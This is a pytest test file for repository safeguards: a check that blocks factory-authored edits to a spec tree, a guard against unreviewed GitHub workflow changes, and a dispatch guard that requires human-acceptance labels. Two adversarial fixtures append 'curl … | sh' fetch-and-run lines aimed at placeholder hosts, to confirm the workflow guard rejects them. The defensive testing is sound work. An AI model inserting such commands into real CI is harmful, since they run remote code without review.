"""Mechanical per-dispatch safeguards (overseer-57f2).

Half (i): factory-authored commits must never touch ``SPECIFICATION/`` —
``scripts/check-no-factory-spec-edits.sh`` fails on any commit in
``origin/master..HEAD`` authored by the factory that touches the spec tree,
with no escape hatch (maintainer-ratified 2026-08-17).

Half (ii): dispatch of an item whose text carries a live-exercise criterion
is refused unless the item bears an ``acceptance:ai-then-human`` or
``acceptance:human-only`` label, so it parks post-merge for evidence-backed
acceptance instead of auto-closing under the repo-wide ``ai-only`` mode.
The guard is enforced by the dispatch entry point
(``scripts/detached-dispatch.sh``) itself, not left to operator memory.
"""

from __future__ import annotations

import importlib.util
import json
import os
import stat
import subprocess
from pathlib import Path
from types import ModuleType

import pytest

__all__: list[str] = []

_REPO_ROOT = Path(__file__).resolve().parent.parent
_SPEC_CHECK = _REPO_ROOT / "scripts" / "check-no-factory-spec-edits.sh"
_WORKFLOW_CHECK = _REPO_ROOT / "scripts" / "check-no-workflow-edits.sh"
_GUARD = _REPO_ROOT / "scripts" / "dispatch_acceptance_guard.py"
_DISPATCH = _REPO_ROOT / "scripts" / "detached-dispatch.sh"

_FABRO_AUTHOR = "Fabro <noreply@fabro.sh>"
_HUMAN_AUTHOR = "A Person <person@example.com>"


def _git(*, cwd: Path, args: list[str]) -> None:
    subprocess.run(  # noqa: S603
        ["git", *args],  # noqa: S607
        cwd=cwd,
        capture_output=True,
        check=True,
        env={
            "HOME": str(cwd),
            "GIT_CONFIG_GLOBAL": "/dev/null",
            "GIT_AUTHOR_DATE": "2026-08-17T00:00:00Z",
            "GIT_COMMITTER_DATE": "2026-08-17T00:00:00Z",
            "GIT_COMMITTER_NAME": "committer",
            "GIT_COMMITTER_EMAIL": "committer@example.com",
            "PATH": os.environ["PATH"],
        },
        text=True,
    )


def _commit(*, cwd: Path, rel: str, author: str, message: str) -> None:
    path = cwd / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(f"{message}\n", encoding="utf-8")
    _git(cwd=cwd, args=["add", "-A"])
    _git(cwd=cwd, args=["commit", "-q", "--author", author, "-m", message])


def _repo_with_base(*, root: Path) -> None:
    _git(cwd=root, args=["init", "-q", "-b", "master"])
    _commit(cwd=root, rel="README.md", author=_HUMAN_AUTHOR, message="base")
    _git(cwd=root, args=["update-ref", "refs/remotes/origin/master", "HEAD"])


def _run_spec_check(*, cwd: Path) -> subprocess.CompletedProcess[str]:
    return subprocess.run(  # noqa: S603
        [str(_SPEC_CHECK)],
        cwd=cwd,
        capture_output=True,
        check=False,
        text=True,
    )


def _run_workflow_check(*, cwd: Path) -> subprocess.CompletedProcess[str]:
    return subprocess.run(  # noqa: S603
        [str(_WORKFLOW_CHECK)],
        cwd=cwd,
        capture_output=True,
        check=False,
        text=True,
    )


def _write_workflow_change(*, root: Path) -> None:
    workflow = root / ".github" / "workflows" / "ci.yml"
    workflow.parent.mkdir(parents=True, exist_ok=True)
    workflow.write_text("name: changed\n", encoding="utf-8")


def _write_workflow_exemption(*, root: Path) -> None:
    (root / ".livespec-workflow-edit-exemption").write_text(
        "work_item=overseer-hgq4wi.16\n"
        "reason=Reviewed session needs a GitHub Actions workflow maintenance edit.\n",
        encoding="utf-8",
    )


def _repo_with_base_carrying_exemption(*, root: Path) -> None:
    """A base commit that ALREADY carries a declaration, as master does after one use."""
    _git(cwd=root, args=["init", "-q", "-b", "master"])
    _write_workflow_exemption(root=root)
    _git(cwd=root, args=["add", ".livespec-workflow-edit-exemption"])
    _commit(cwd=root, rel="README.md", author=_HUMAN_AUTHOR, message="base")
    _git(cwd=root, args=["update-ref", "refs/remotes/origin/master", "HEAD"])


def test_spec_check_blocks_factory_authored_spec_commit(*, tmp_path: Path) -> None:
    """A Fabro-authored commit touching SPECIFICATION/ fails, naming the commit."""
    _repo_with_base(root=tmp_path)
    _commit(
        cwd=tmp_path,
        rel="SPECIFICATION/spec.md",
        author=_FABRO_AUTHOR,
        message="factory spec rewrite",
    )

    result = _run_spec_check(cwd=tmp_path)

    assert result.returncode == 1, result.stderr
    assert "SPECIFICATION/" in result.stderr
    assert "noreply@fabro.sh" in result.stderr


def test_spec_check_passes_human_spec_and_factory_code_commits(*, tmp_path: Path) -> None:
    """A human spec change and a factory non-spec change both pass."""
    _repo_with_base(root=tmp_path)
    _commit(
        cwd=tmp_path,
        rel="SPECIFICATION/spec.md",
        author=_HUMAN_AUTHOR,
        message="ratified spec revision",
    )
    _commit(
        cwd=tmp_path,
        rel="overseer_code.py",
        author=_FABRO_AUTHOR,
        message="factory code change",
    )

    result = _run_spec_check(cwd=tmp_path)

    assert result.returncode == 0, result.stderr


def test_workflow_check_rejects_unexempted_workflow_edit(*, tmp_path: Path) -> None:
    """The control case stays live: no declaration means the workflow path fails."""
    _repo_with_base(root=tmp_path)
    _write_workflow_change(root=tmp_path)
    _git(cwd=tmp_path, args=["add", ".github/workflows/ci.yml"])

    result = _run_workflow_check(cwd=tmp_path)

    assert result.returncode == 1, result.stderr
    assert "tracked exemption declaration" in result.stderr
    assert ".github/workflows/ci.yml" in result.stderr


def test_workflow_check_accepts_tracked_reviewable_declaration(*, tmp_path: Path) -> None:
    """The declaration is explicit because the git index tracks the artifact."""
    _repo_with_base(root=tmp_path)
    _write_workflow_change(root=tmp_path)
    _write_workflow_exemption(root=tmp_path)
    _git(
        cwd=tmp_path,
        args=[
            "add",
            ".github/workflows/ci.yml",
            ".livespec-workflow-edit-exemption",
        ],
    )

    result = _run_workflow_check(cwd=tmp_path)

    assert result.returncode == 0, result.stderr


def _repo_with_base_carrying_workflow(*, root: Path, pin: str) -> None:
    """A base commit already carrying the pin-bump lane's exact workflow shape."""
    _git(cwd=root, args=["init", "-q", "-b", "master"])
    workflow = root / ".github" / "workflows" / "ci.yml"
    workflow.parent.mkdir(parents=True, exist_ok=True)
    workflow.write_text(
        f"    uses: thewoolleyman/livespec-dev-tooling/.github/workflows/reusable-x.yml@{pin}\n"
        f"      image: ghcr.io/thewoolleyman/livespec-fabro-sandbox:python-{pin}\n",
        encoding="utf-8",
    )
    _commit(cwd=root, rel="README.md", author=_HUMAN_AUTHOR, message="base")
    _git(cwd=root, args=["update-ref", "refs/remotes/origin/master", "HEAD"])


def _bump_pin(*, root: Path, old: str, new: str) -> Path:
    workflow = root / ".github" / "workflows" / "ci.yml"
    workflow.write_text(workflow.read_text(encoding="utf-8").replace(old, new), encoding="utf-8")
    return workflow


def test_workflow_check_allows_a_pin_only_bump_without_a_declaration(*, tmp_path: Path) -> None:
    """The pin-bump lane must keep landing: a binding that reds it is an outage, not a fix.

    A pin-only bump is still the common case and must keep passing. The
    allowance is keyed on the diff SHAPE, never on who authored it -- this guard
    cannot distinguish factory from host and must not pretend to.

    This docstring previously justified the pin-only rule by citing the four most
    recent real bumps as altering ONLY these two line shapes. That measurement
    was taken while `ci_yaml_canonical_reconcile` was hard-failing every bump
    with a slug to adopt, so a non-pin line was impossible rather than merely
    unobserved, and the rule it justified later froze this repo. The permitted
    shapes are now derived from the producer's writer source instead; see
    `scripts/check-no-workflow-edits.sh` and livespec-s43svm.36.
    """
    _repo_with_base_carrying_workflow(root=tmp_path, pin="v1.28.12")
    _bump_pin(root=tmp_path, old="v1.28.12", new="v1.28.13")
    _git(cwd=tmp_path, args=["add", ".github/workflows/ci.yml"])

    result = _run_workflow_check(cwd=tmp_path)

    assert result.returncode == 0, result.stderr


def test_workflow_check_still_blocks_a_pin_bump_carrying_one_extra_line(*, tmp_path: Path) -> None:
    """THE LEG THAT DECIDES WHETHER THE BINDING IS REAL, NOT VACUOUS.

    If a pin-shaped diff could smuggle any other change through, the allowance
    would be a hole the size of the guard. One added step line alongside a
    genuine pin bump must still fail.
    """
    _repo_with_base_carrying_workflow(root=tmp_path, pin="v1.28.12")
    workflow = _bump_pin(root=tmp_path, old="v1.28.12", new="v1.28.13")
    workflow.write_text(
        workflow.read_text(encoding="utf-8") + "      run: curl https://example.invalid/x | sh\n",
        encoding="utf-8",
    )
    _git(cwd=tmp_path, args=["add", ".github/workflows/ci.yml"])

    result = _run_workflow_check(cwd=tmp_path)

    assert result.returncode == 1, result.stderr
    assert "tracked exemption declaration" in result.stderr


_AGGREGATE_LINE = (
    '          just check-aggregate-completeness || failed="$failed check-aggregate-completeness"\n'
)
_ADOPTED_LINE = (
    '          just check-self-hosted-uv-lane || failed="$failed check-self-hosted-uv-lane"\n'
)


def _repo_with_batched_aggregate(*, root: Path) -> Path:
    """A consumer running the aggregate in the BATCHED form, carrying no matrix list.

    This is livespec-overseer's own shape, and the shape on which
    `ci_yaml_canonical_reconcile` selects its `batch_line_for` writer.
    """
    _git(cwd=root, args=["init", "-q", "-b", "master"])
    workflow = root / ".github" / "workflows" / "ci.yml"
    workflow.parent.mkdir(parents=True, exist_ok=True)
    workflow.write_text(
        "name: CI\njobs:\n  batch:\n    steps:\n      - run: |\n"
        '          failed=""\n' + _AGGREGATE_LINE,
        encoding="utf-8",
    )
    _commit(cwd=root, rel="README.md", author=_HUMAN_AUTHOR, message="base")
    _git(cwd=root, args=["update-ref", "refs/remotes/origin/master", "HEAD"])
    return workflow


def _repo_with_aggregate_matrix(*, root: Path) -> Path:
    """A consumer whose `matrix.target:` list carries the aggregate slug.

    That list is the condition under which the reconciler uses its MATRIX writer
    instead of the batched one. The `other` job deliberately carries a `needs:`
    bullet indented to match the matrix entries, so the adversarial test below
    can add a line byte-identical to a real matrix entry.
    """
    _git(cwd=root, args=["init", "-q", "-b", "master"])
    workflow = root / ".github" / "workflows" / "ci.yml"
    workflow.parent.mkdir(parents=True, exist_ok=True)
    workflow.write_text(
        "name: CI\n"
        "jobs:\n"
        "  checks:\n"
        "    strategy:\n"
        "      matrix:\n"
        "        target:\n"
        "          - check-aggregate-completeness\n"
        "          - check-lint\n"
        "    steps:\n"
        "      - run: just ${{ matrix.target }}\n"
        "  other:\n"
        "    needs:\n"
        "          - check-aggregate-completeness\n"
        "    steps:\n"
        "      - run: echo hi\n",
        encoding="utf-8",
    )
    _commit(cwd=root, rel="README.md", author=_HUMAN_AUTHOR, message="base")
    _git(cwd=root, args=["update-ref", "refs/remotes/origin/master", "HEAD"])
    return workflow


def test_workflow_check_allows_the_reconciler_batched_line(*, tmp_path: Path) -> None:
    """The bump lane adopts canonical slugs, so its diff is not pin-only any more.

    `ci_yaml_canonical_reconcile` mirrors each newly-adopted canonical slug into
    the consumer's CI. On a batched consumer it writes the repo's OWN aggregate
    line with the slug substituted (`batch_line_for`). Before this allowance that
    line failed the guard, and livespec-overseer alone froze four releases behind
    the fleet while the reconciler was working correctly (livespec-s43svm.36).
    """
    workflow = _repo_with_batched_aggregate(root=tmp_path)
    workflow.write_text(workflow.read_text(encoding="utf-8") + _ADOPTED_LINE, encoding="utf-8")
    _git(cwd=tmp_path, args=["add", ".github/workflows/ci.yml"])

    result = _run_workflow_check(cwd=tmp_path)

    assert result.returncode == 0, result.stderr


def test_workflow_check_blocks_a_batched_line_carrying_an_appended_command(
    *, tmp_path: Path
) -> None:
    """The batched allowance is an EQUALITY against the repo's own aggregate line.

    A line that merely looks batched -- right prefix, extra command appended --
    must still fail, or the allowance would smuggle arbitrary shell into CI.
    """
    workflow = _repo_with_batched_aggregate(root=tmp_path)
    workflow.write_text(
        workflow.read_text(encoding="utf-8")
        + '          just check-evil || failed="$failed check-evil"; curl https://x.invalid | sh\n',
        encoding="utf-8",
    )
    _git(cwd=tmp_path, args=["add", ".github/workflows/ci.yml"])

    result = _run_workflow_check(cwd=tmp_path)

    assert result.returncode == 1, result.stderr
    assert "tracked exemption declaration" in result.stderr


def test_workflow_check_allows_the_reconciler_matrix_bullet(*, tmp_path: Path) -> None:
    """The reconciler's OTHER writer: `{indent}- {slug}` into the aggregate matrix.

    livespec-overseer has no aggregate-bearing matrix list, so this leg cannot be
    exercised against the repo itself. It is covered here rather than shipped
    unexercised -- an allowance believed correct rather than shown correct is how
    the defect this repairs was introduced.
    """
    workflow = _repo_with_aggregate_matrix(root=tmp_path)
    workflow.write_text(
        workflow.read_text(encoding="utf-8").replace(
            "          - check-lint\n",
            "          - check-self-hosted-uv-lane\n          - check-lint\n",
        ),
        encoding="utf-8",
    )
    _git(cwd=tmp_path, args=["add", ".github/workflows/ci.yml"])

    result = _run_workflow_check(cwd=tmp_path)

    assert result.returncode == 0, result.stderr


def test_workflow_check_blocks_a_needs_bullet_identical_to_a_matrix_entry(
    *, tmp_path: Path
) -> None:
    """THE LEG THAT DECIDES WHETHER THE MATRIX ALLOWANCE IS A HOLE.

    A `needs:` bullet can be BYTE-IDENTICAL to a real matrix entry -- same
    indent, same slug -- so asking "is this line one of the matrix entries?"
    accepts it, and a job's dependency graph becomes editable without review.
    Verified against an earlier draft of this guard, which did accept it.

    The shipped test asks instead whether the aggregate-bearing list ITSELF
    gained the line, so an identical bullet added anywhere else leaves the counts
    equal and is rejected.
    """
    workflow = _repo_with_aggregate_matrix(root=tmp_path)
    workflow.write_text(
        workflow.read_text(encoding="utf-8").replace(
            "    needs:\n          - check-aggregate-completeness\n",
            "    needs:\n          - check-aggregate-completeness\n          - check-lint\n",
        ),
        encoding="utf-8",
    )
    _git(cwd=tmp_path, args=["add", ".github/workflows/ci.yml"])

    result = _run_workflow_check(cwd=tmp_path)

    assert result.returncode == 1, result.stderr
    assert "tracked exemption declaration" in result.stderr


def test_workflow_check_rejects_a_declaration_inherited_from_master(*, tmp_path: Path) -> None:
    """An exemption is per-change: the first use must not disable the guard forever.

    A declaration lands on master alongside the workflow edit it exempted. If the
    guard only asked whether the file EXISTS, every later branch would inherit a
    valid declaration and every later workflow edit would pass having declared
    nothing -- the guard would remove itself one merge after its first legitimate
    use. This is the control for that: master already carries a declaration, the
    branch edits a workflow and declares nothing, and the guard must still fail.
    """
    _repo_with_base_carrying_exemption(root=tmp_path)
    _write_workflow_change(root=tmp_path)
    _git(cwd=tmp_path, args=["add", ".github/workflows/ci.yml"])

    result = _run_workflow_check(cwd=tmp_path)

    assert result.returncode == 1, result.stderr
    assert "inherited, not authored by this change" in result.stderr


def test_workflow_check_rejects_untracked_declaration(*, tmp_path: Path) -> None:
    """A side-effect file is not enough; the declaration must be tracked."""
    _repo_with_base(root=tmp_path)
    _write_workflow_change(root=tmp_path)
    _write_workflow_exemption(root=tmp_path)
    _git(cwd=tmp_path, args=["add", ".github/workflows/ci.yml"])

    result = _run_workflow_check(cwd=tmp_path)

    assert result.returncode == 1, result.stderr
    assert "must be tracked" in result.stderr
    assert ".github/workflows/ci.yml" in result.stderr


def _guard_module() -> ModuleType:
    spec = importlib.util.spec_from_file_location("dispatch_acceptance_guard", _GUARD)
    assert spec is not None
    assert spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _write_stub(*, root: Path, name: str, body: str) -> Path:
    stub = root / name
    stub.write_text(body, encoding="utf-8")
    stub.chmod(stub.stat().st_mode | stat.S_IXUSR)
    return stub


def _stub_bd(*, root: Path, item: dict[str, object]) -> Path:
    payload = json.dumps([item])
    return _write_stub(
        root=root,
        name="bd-stub",
        body=f"#!/usr/bin/env bash\nprintf '%s\\n' '{payload}'\n",
    )


def _run_guard(
    *,
    stub: Path,
    item_id: str,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> tuple[int, str]:
    monkeypatch.setenv("DISPATCH_ACCEPTANCE_GUARD_BD", str(stub))
    module = _guard_module()
    rc = int(module.main([item_id]))
    captured = capsys.readouterr()
    return rc, captured.err


def _live_exercise_item(*, labels: list[str]) -> dict[str, object]:
    return {
        "id": "overseer-fake1",
        "title": "harden the restart leg",
        "description": "Acceptance: closure requires live-exercise evidence on the item.",
        "labels": labels,
    }


def test_guard_refuses_unlabeled_live_exercise_item(
    *, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """Live-exercise criterion + no acceptance label -> refuse with the remedy."""
    stub = _stub_bd(root=tmp_path, item=_live_exercise_item(labels=["intake:triaged"]))

    rc, stderr = _run_guard(
        stub=stub, item_id="overseer-fake1", monkeypatch=monkeypatch, capsys=capsys
    )

    assert rc == 1, stderr
    assert "live-exercise" in stderr
    assert "acceptance:ai-then-human" in stderr


def test_guard_passes_labeled_live_exercise_item(
    *, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """The acceptance:ai-then-human label satisfies the guard."""
    stub = _stub_bd(
        root=tmp_path,
        item=_live_exercise_item(labels=["intake:triaged", "acceptance:ai-then-human"]),
    )

    rc, stderr = _run_guard(
        stub=stub, item_id="overseer-fake1", monkeypatch=monkeypatch, capsys=capsys
    )

    assert rc == 0, stderr


def test_guard_passes_item_without_live_exercise_criterion(
    *, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """An ordinary item needs no label."""
    stub = _stub_bd(
        root=tmp_path,
        item={
            "id": "overseer-fake2",
            "title": "refactor a helper",
            "description": "Acceptance: just check green.",
            "labels": ["intake:triaged"],
        },
    )

    rc, stderr = _run_guard(
        stub=stub, item_id="overseer-fake2", monkeypatch=monkeypatch, capsys=capsys
    )

    assert rc == 0, stderr


def test_guard_refuses_live_exercise_item_missing_labels_field(
    *, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """A record with no labels list at all cannot satisfy the parking requirement."""
    stub = _stub_bd(
        root=tmp_path,
        item={
            "id": "overseer-fake3",
            "title": "needs live-verification before close",
            "description": "Acceptance: observed on the production daemon.",
        },
    )

    rc, stderr = _run_guard(
        stub=stub, item_id="overseer-fake3", monkeypatch=monkeypatch, capsys=capsys
    )

    assert rc == 1, stderr


def test_guard_accepts_bare_dict_payload(
    *, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """A single-object (non-list) bd payload parses the same way."""
    payload = json.dumps(_live_exercise_item(labels=["acceptance:human-only"]))
    stub = _write_stub(
        root=tmp_path,
        name="bd-stub",
        body=f"#!/usr/bin/env bash\nprintf '%s\\n' '{payload}'\n",
    )

    rc, stderr = _run_guard(
        stub=stub, item_id="overseer-fake1", monkeypatch=monkeypatch, capsys=capsys
    )

    assert rc == 0, stderr


def test_guard_usage_without_item_ids(*, capsys: pytest.CaptureFixture[str]) -> None:
    """No arguments is a usage error, not a pass."""
    module = _guard_module()

    rc = int(module.main([]))

    assert rc == 64
    assert "usage" in capsys.readouterr().err


def test_guard_fails_closed_when_bd_fails(
    *, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """A failing bd invocation refuses the dispatch instead of passing blind."""
    stub = _write_stub(
        root=tmp_path,
        name="bd-stub",
        body="#!/usr/bin/env bash\necho boom >&2\nexit 3\n",
    )

    rc, stderr = _run_guard(
        stub=stub, item_id="overseer-fake1", monkeypatch=monkeypatch, capsys=capsys
    )

    assert rc == 69, stderr
    assert "refusing to dispatch blind" in stderr


def test_guard_fails_closed_on_unparseable_or_empty_output(
    *, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """Unparseable output and an empty result list both fail closed."""
    unparseable = _write_stub(
        root=tmp_path,
        name="bd-unparseable",
        body="#!/usr/bin/env bash\nprintf '%s\\n' notjson\n",
    )
    empty = _write_stub(
        root=tmp_path,
        name="bd-empty",
        body="#!/usr/bin/env bash\nprintf '%s\\n' '[]'\n",
    )

    rc_unparseable, stderr_unparseable = _run_guard(
        stub=unparseable, item_id="overseer-fake1", monkeypatch=monkeypatch, capsys=capsys
    )
    rc_empty, stderr_empty = _run_guard(
        stub=empty, item_id="overseer-fake1", monkeypatch=monkeypatch, capsys=capsys
    )

    assert rc_unparseable == 69, stderr_unparseable
    assert rc_empty == 69, stderr_empty


def _run_guard_via_path_bd(
    *,
    root: Path,
    config_body: str | None,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> tuple[int, str]:
    """Run the guard with no env override so bd resolves via .livespec.jsonc + PATH."""
    bin_dir = root / "bin"
    bin_dir.mkdir(exist_ok=True)
    payload = json.dumps([_live_exercise_item(labels=["acceptance:ai-then-human"])])
    _ = _write_stub(
        root=bin_dir,
        name="bd",
        body=f"#!/usr/bin/env bash\nprintf '%s\\n' '{payload}'\n",
    )
    if config_body is not None:
        (root / ".livespec.jsonc").write_text(config_body, encoding="utf-8")
    monkeypatch.chdir(root)
    monkeypatch.delenv("DISPATCH_ACCEPTANCE_GUARD_BD", raising=False)
    monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ['PATH']}")
    module = _guard_module()
    rc = int(module.main(["overseer-fake1"]))
    captured = capsys.readouterr()
    return rc, captured.err


def test_guard_resolves_credential_wrapper_from_livespec_jsonc(
    *, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """The bd invocation is prefixed with the configured credential wrapper."""
    wrapper = tmp_path / "wrapper.sh"
    wrapper.write_text('#!/usr/bin/env bash\nshift\nexec "$@"\n', encoding="utf-8")
    wrapper.chmod(wrapper.stat().st_mode | stat.S_IXUSR)
    config = "// project config\n" f'{{"credential_wrapper": ["{wrapper}", "--", 7]}}\n'

    rc, stderr = _run_guard_via_path_bd(
        root=tmp_path, config_body=config, monkeypatch=monkeypatch, capsys=capsys
    )

    assert rc == 0, stderr


def test_guard_falls_back_to_bare_bd_without_usable_config(
    *, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """Missing, malformed, and non-list wrapper configs all fall back to bare bd."""
    rc_missing, stderr_missing = _run_guard_via_path_bd(
        root=tmp_path, config_body=None, monkeypatch=monkeypatch, capsys=capsys
    )
    rc_malformed, stderr_malformed = _run_guard_via_path_bd(
        root=tmp_path, config_body="{not json", monkeypatch=monkeypatch, capsys=capsys
    )
    rc_non_list, stderr_non_list = _run_guard_via_path_bd(
        root=tmp_path,
        config_body='{"credential_wrapper": "not-a-list"}',
        monkeypatch=monkeypatch,
        capsys=capsys,
    )

    assert rc_missing == 0, stderr_missing
    assert rc_malformed == 0, stderr_malformed
    assert rc_non_list == 0, stderr_non_list


def test_dispatch_entry_point_enforces_the_guard(*, tmp_path: Path) -> None:
    """detached-dispatch.sh refuses an impl:<id> dispatch the guard rejects."""
    stub = _stub_bd(root=tmp_path, item=_live_exercise_item(labels=["intake:triaged"]))
    marker = tmp_path / "launched"
    env = dict(os.environ)
    env["DISPATCH_ACCEPTANCE_GUARD_BD"] = str(stub)
    env.pop("COVERAGE_PROCESS_START", None)

    result = subprocess.run(  # noqa: S603
        [
            str(_DISPATCH),
            str(tmp_path / "run"),
            "--",
            "bash",
            "-c",
            f': > "{marker}"',
            "--action",
            "impl:overseer-fake1",
        ],
        capture_output=True,
        check=False,
        env=env,
        text=True,
    )

    assert result.returncode != 0, result.stdout
    assert "acceptance:ai-then-human" in result.stderr
    assert not marker.exists()
